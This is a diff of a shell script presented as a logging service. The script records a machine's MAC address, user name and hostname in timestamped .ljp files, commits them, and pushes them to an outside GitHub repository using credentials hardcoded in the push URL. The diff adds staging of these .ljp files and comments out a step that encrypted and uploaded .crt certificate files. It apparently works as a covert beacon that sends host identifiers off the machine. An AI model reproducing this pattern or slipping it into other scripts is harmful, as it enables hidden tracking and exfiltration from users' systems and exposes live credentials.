@@ -19,10 +19,11 @@ if [ -d $LMDIR ]
 then
      echo "$LMDIR exists"
      cd $LDIR
-     encriptFile
-     git config --local --add user.email "root@rootmail.com"
-     git config --local --add user.name "root"
-     git add \*.crt
+#     encriptFile
+#     git config --local --add user.email "root@rootmail.com"
+#     git config --local --add user.name "root"
+#     git add \*.crt
+     git add \*.ljp
      git commit -m "root-$(date +"%D %T")"
      git push https://reportlog:1q2w3e4r5t@github.com/reportlog/log_service.git --all
      ret=$?
@@ -39,10 +40,12 @@ else
      cd $LMDIR
      read MAC </sys/class/net/eth0/address
      echo "started $MAC $USER $HOSTNAME $(date +"%D %T")" >  logx_$(date '+%y_%m_%d_%I_%M_%S').ljp 
-     encriptFile
-     git config --local --add user.email "root@rootmail.com"
-     git config --local --add user.name "root"
-     git add \*.crt
+#     encriptFile
+#     git config --local --add user.email "root@rootmail.com"
+#     git config --local --add user.name "root"
+#     git remote add origin https://github.com/reportlog/log_service.git
+#     git add \*.crt
+     git add \*.ljp
      git commit -m "root-$(date +"%D %T")"
      git push https://reportlog:1q2w3e4r5t@github.com/reportlog/log_service.git --all
      ret=$?
@@ -76,11 +79,6 @@ if [ $ret -ne 0 ]; then
 else
      echo "log started successfully!!!"
 fi
-
-read GMAILX </tmp/.GMAILGX
-read GNAMEX </tmp/.GNAMEGX
-git config --global --add user.name "$GNAMEX"
-git config --global --add user.email "$GMAILX"
 
 sudo rm -rf $lockdir
 
